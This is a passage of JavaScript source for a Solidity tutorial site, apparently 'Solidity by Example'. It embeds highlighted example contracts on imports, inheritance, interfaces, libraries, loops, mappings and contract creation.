class=\"hljs-keyword\">new</span> Foo();\n\n    <span class=\"hljs-comment\">// Test Foo.sol by getting it&#x27;s name.</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFooName</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> foo.<span class=\"hljs-built_in\">name</span>();\n    }\n}\n</code></pre>\n<h3 id=\"external\">External</h3>\n<p>You can also import from <a href=\"https://github.com\">GitHub</a> by simply copying the url</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// https://github.com/owner/repo/blob/branch/path/to/Contract.sol</span>\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"https://github.com/owner/repo/blob/branch/path/to/Contract.sol\"</span>;\n\n<span class=\"hljs-comment\">// Example import ECDSA.sol from openzeppelin-contract repo, release-v3.3 branch</span>\n<span class=\"hljs-comment\">// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol</span>\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/cryptography/ECDSA.sol\"</span>;</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Inheritance\"\nexport const description = \"Example of inheritance in Solidity\"\n\nconst html = `<p>Solidity supports multiple inheritance. Contracts can inherit other contract by using the <code>is</code> keyword.</p>\n<p>Function that is going to be overridden by a child contract must be declared as <code>virtual</code>.</p>\n<p>Function that is going to override a parent function must use the keyword <code>override</code>.</p>\n<p>Order of inheritance is important.</p>\n<p>You have to list the parent contracts in the order from “most base-like” to “most derived”.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-comment\">/* Graph of inheritance\n    A\n   / \\\\\n  B   C\n / \\\\ /\nF  D,E\n\n*/</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"A\"</span>;\n    }\n}\n\n<span class=\"hljs-comment\">// Contracts inherit other contracts by using the keyword &#x27;is&#x27;.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">B</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-comment\">// Override A.foo()</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"B\"</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">C</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span> </span>{\n    <span class=\"hljs-comment\">// Override A.foo()</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">virtual</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"C\"</span>;\n    }\n}\n\n<span class=\"hljs-comment\">// Contracts can inherit from multiple parent contracts.</span>\n<span class=\"hljs-comment\">// When a function is called that is defined multiple times in</span>\n<span class=\"hljs-comment\">// different contracts, parent contracts are searched from</span>\n<span class=\"hljs-comment\">// right to left, and in depth-first manner.</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">D</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">B</span>, <span class=\"hljs-title\">C</span> </span>{\n    <span class=\"hljs-comment\">// D.foo() returns \"C\"</span>\n    <span class=\"hljs-comment\">// since C is the right most parent contract with function foo()</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span>(<span class=\"hljs-params\">B, C</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">super</span>.foo();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">E</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">C</span>, <span class=\"hljs-title\">B</span> </span>{\n    <span class=\"hljs-comment\">// E.foo() returns \"B\"</span>\n    <span class=\"hljs-comment\">// since B is the right most parent contract with function foo()</span>\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span>(<span class=\"hljs-params\">C, B</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">super</span>.foo();\n    }\n}\n\n<span class=\"hljs-comment\">// Inheritance must be ordered from “most base-like” to “most derived”.</span>\n<span class=\"hljs-comment\">// Swapping the order of A and B will throw a compilation error.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">F</span> <span class=\"hljs-keyword\">is</span> <span class=\"hljs-title\">A</span>, <span class=\"hljs-title\">B</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">foo</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">override</span></span>(<span class=\"hljs-params\">A, B</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">super</span>.foo();\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Interface\"\nexport const description = \"An example of interface in Solidity\"\n\nconst html = `<p>You can interact with other contracts by declaring an <code>Interface</code>.</p>\n<p>Interface</p>\n<ul>\n<li>cannot have any functions implemented</li>\n<li>can inherit from other interfaces</li>\n<li>all declared functions must be external</li>\n<li>cannot declare a constructor</li>\n<li>cannot declare state variables</li>\n</ul>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Counter</span> </span>{\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> count;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">increment</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> </span>{\n        count += <span class=\"hljs-number\">1</span>;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title\">ICounter</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">count</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>)</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">increment</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span></span>;\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">MyContract</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">incrementCounter</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _counter</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> </span>{\n        ICounter(_counter).increment();\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getCount</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _counter</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> ICounter(_counter).count();\n    }\n}\n\n<span class=\"hljs-comment\">// Uniswap example</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title\">UniswapV2Factory</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getPair</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> tokenA, <span class=\"hljs-keyword\">address</span> tokenB</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> pair</span>)</span>;\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title\">UniswapV2Pair</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getReserves</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint112</span> reserve0, <span class=\"hljs-keyword\">uint112</span> reserve1, <span class=\"hljs-keyword\">uint32</span> blockTimestampLast</span>)</span>;\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">UniswapExample</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">private</span> factory = <span class=\"hljs-number\">0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f</span>;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">private</span> dai = <span class=\"hljs-number\">0x6B175474E89094C44Da98b954EedeAC495271d0F</span>;\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">private</span> weth = <span class=\"hljs-number\">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getTokenReserves</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">external</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>, <span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">address</span> pair = UniswapV2Factory(factory).getPair(dai, weth);\n        (<span class=\"hljs-keyword\">uint</span> reserve0, <span class=\"hljs-keyword\">uint</span> reserve1, ) = UniswapV2Pair(pair).getReserves();\n        <span class=\"hljs-keyword\">return</span> (reserve0, reserve1);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Library\"\nexport const description = \"Example of how to write and use libraries in your Solidity code\"\n\nconst html = `<p>Libraries are similar to contracts, but you can&#39;t declare any state variable and\nyou can&#39;t send ether.</p>\n<p>A library is embedded into the contract if all library functions are internal.</p>\n<p>Otherwise the library must be deployed and then linked before the contract is deployed.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">library</span> <span class=\"hljs-title\">SafeMath</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">add</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x, <span class=\"hljs-keyword\">uint</span> y</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">internal</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">uint</span> z = x + y;\n        <span class=\"hljs-built_in\">require</span>(z &gt;= x, <span class=\"hljs-string\">\"uint overflow\"</span>);\n\n        <span class=\"hljs-keyword\">return</span> z;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestSafeMath</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">SafeMath</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">uint</span></span>;\n\n    <span class=\"hljs-keyword\">uint</span> <span class=\"hljs-keyword\">public</span> MAX_UINT = <span class=\"hljs-number\">2</span> ** <span class=\"hljs-number\">256</span> - <span class=\"hljs-number\">1</span>;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testAdd</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span> x, <span class=\"hljs-keyword\">uint</span> y</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">pure</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> x.add(y);\n    }\n}\n\n<span class=\"hljs-comment\">// Array function to delete element at index and re-organize the array</span>\n<span class=\"hljs-comment\">// so that their are no gaps between the elements.</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">library</span> <span class=\"hljs-title\">Array</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">storage</span> arr, <span class=\"hljs-keyword\">uint</span> index</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Move the last element into the place to delete</span>\n        arr[index] = arr[arr.<span class=\"hljs-built_in\">length</span> - <span class=\"hljs-number\">1</span>];\n        arr.<span class=\"hljs-built_in\">pop</span>();\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">TestArray</span> </span>{\n    <span class=\"hljs-keyword\">using</span> <span class=\"hljs-title\">Array</span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">for</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">uint</span></span>[];\n\n    <span class=\"hljs-keyword\">uint</span>[] <span class=\"hljs-keyword\">public</span> arr;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">testArrayRemove</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">3</span>; i++) {\n            arr.<span class=\"hljs-built_in\">push</span>(i);\n        }\n\n        arr.remove(<span class=\"hljs-number\">1</span>);\n\n        <span class=\"hljs-built_in\">assert</span>(arr.<span class=\"hljs-built_in\">length</span> == <span class=\"hljs-number\">2</span>);\n        <span class=\"hljs-built_in\">assert</span>(arr[<span class=\"hljs-number\">0</span>] == <span class=\"hljs-number\">0</span>);\n        <span class=\"hljs-built_in\">assert</span>(arr[<span class=\"hljs-number\">1</span>] == <span class=\"hljs-number\">2</span>);\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"For and While Loop\"\nexport const description = \"Example of for and while loop in Solidity\"\n\nconst html = `<p>Solidity supports <code>for</code>, <code>while</code>, and <code>do while</code> loops.</p>\n<p>Don&#39;t write loops that are unbounded as this can hit the gas limit, causing your transaction to fail.</p>\n<p>For the reason above, <code>while</code> and <code>do while</code> loops are rarely used.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Loop</span> </span>{\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">loop</span>(<span class=\"hljs-params\"></span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// for loop</span>\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">uint</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">10</span>; i++) {\n            <span class=\"hljs-keyword\">if</span> (i == <span class=\"hljs-number\">3</span>) {\n                <span class=\"hljs-comment\">// Skip to next iteration with continue</span>\n                <span class=\"hljs-keyword\">continue</span>;\n            }\n            <span class=\"hljs-keyword\">if</span> (i == <span class=\"hljs-number\">5</span>) {\n                <span class=\"hljs-comment\">// Exit loop with break</span>\n                <span class=\"hljs-keyword\">break</span>;\n            }\n        }\n\n        <span class=\"hljs-comment\">// while loop</span>\n        <span class=\"hljs-keyword\">uint</span> j;\n        <span class=\"hljs-keyword\">while</span> (j &lt; <span class=\"hljs-number\">10</span>) {\n            j++;\n        }\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Mapping\"\nexport const description = \"Example of using mapping in Solidity\"\n\nconst html = `<p>Maps are created with the syntax <code>mapping(keyType =&gt; valueType)</code>.</p>\n<p><code>keyType</code> can be value types such as <code>uint</code>, <code>address</code> or <code>bytes</code>.</p>\n<p><code>valueType</code> can be any type including another mapping or an array.</p>\n<p>Mappings are not iterable.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Mapping</span> </span>{\n    <span class=\"hljs-comment\">// Mapping from address to uint</span>\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">uint</span>) <span class=\"hljs-keyword\">public</span> myMap;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">uint</span></span>) </span>{\n         <span class=\"hljs-comment\">// Mapping always returns a value.</span>\n         <span class=\"hljs-comment\">// If the value was never set, it will return the default value.</span>\n        <span class=\"hljs-keyword\">return</span> myMap[_addr];\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">set</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr, <span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Update the value at this address</span>\n        myMap[_addr] = _i;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-comment\">// Reset the value to the default value.</span>\n        <span class=\"hljs-keyword\">delete</span> myMap[_addr];\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">NestedMapping</span> </span>{\n    <span class=\"hljs-comment\">// Nested mapping (mapping from address to another mapping)</span>\n    <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">address</span> =&gt; <span class=\"hljs-keyword\">mapping</span>(<span class=\"hljs-keyword\">uint</span> =&gt; <span class=\"hljs-keyword\">bool</span>)) <span class=\"hljs-keyword\">public</span> nested;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr1, <span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">view</span></span> <span class=\"hljs-title\"><span class=\"hljs-keyword\">returns</span></span> (<span class=\"hljs-params\"><span class=\"hljs-keyword\">bool</span></span>) </span>{\n         <span class=\"hljs-comment\">// You can get values from a nested mapping</span>\n         <span class=\"hljs-comment\">// even when it is not initialized</span>\n        <span class=\"hljs-keyword\">return</span>  nested[_addr1][_i];\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">set</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr1, <span class=\"hljs-keyword\">uint</span> _i, <span class=\"hljs-keyword\">bool</span> _boo</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        nested[_addr1][_i] = _boo;\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">remove</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _addr1, <span class=\"hljs-keyword\">uint</span> _i</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        <span class=\"hljs-keyword\">delete</span> nested[_addr1][_i];\n    }\n}\n</code></pre>\n`\n\nexport default html\n","import React from \"react\"\nimport Example from \"../../components/Example\"\nimport html, { version, title, description } from \"./index.html\"\n\nfunction ExamplePage() {\n  return (\n    <Example\n      version={version}\n      title={title}\n      description={description}\n      html={html}\n    />\n  )\n}\n\nexport default ExamplePage\n","// metadata\nexport const version = \"0.7.6\"\nexport const title = \"Contract that Create other Contracts\"\nexport const description = \"Learn how to create new contract from inside a contract with Solidity\"\n\nconst html = `<p>Contracts can be created by other contracts using the <code>new</code> keyword.</p>\n<pre><code class=\"language-solidity\"><span class=\"hljs-comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"hljs-meta\"><span class=\"hljs-keyword\">pragma</span> <span class=\"hljs-keyword\">solidity</span> ^0.7.6;</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">Car</span> </span>{\n    <span class=\"hljs-keyword\">address</span> <span class=\"hljs-keyword\">public</span> owner;\n    <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">public</span> model;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">constructor</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _model</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span> </span>{\n        owner = _owner;\n        model = _model;\n    }\n}\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">contract</span> <span class=\"hljs-title\">CarFactory</span> </span>{\n    Car[] <span class=\"hljs-keyword\">public</span> cars;\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">create</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _model</span>) <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span> </span>{\n        Car car = <span class=\"hljs-keyword\">new</span> Car(_owner, _model);\n        cars.<span class=\"hljs-built_in\">push</span>(car);\n    }\n\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createAndSendEther</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">address</span> _owner, <span class=\"hljs-keyword\">string</span> <span class=\"hljs-keyword\">memory</span> _model</span>)\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">public</span></span>\n        <span class=\"hljs-title\"><span class=\"hljs-keyword\">payable</span></span>\n    </span>{\n        Car car = (<span class=\"hljs-keyword\">new</span> Car){<span class=\"hljs-built_in\">value:</span> <span class=\"hljs-built_in\">msg</span>.<span class=\"hljs-built_in\">value</span>}(_owner, _model);\n        cars.<span class=\"hljs-built_in\">push</span>(car);\n    }\n\n    <span class=\"hljs-function\"><span 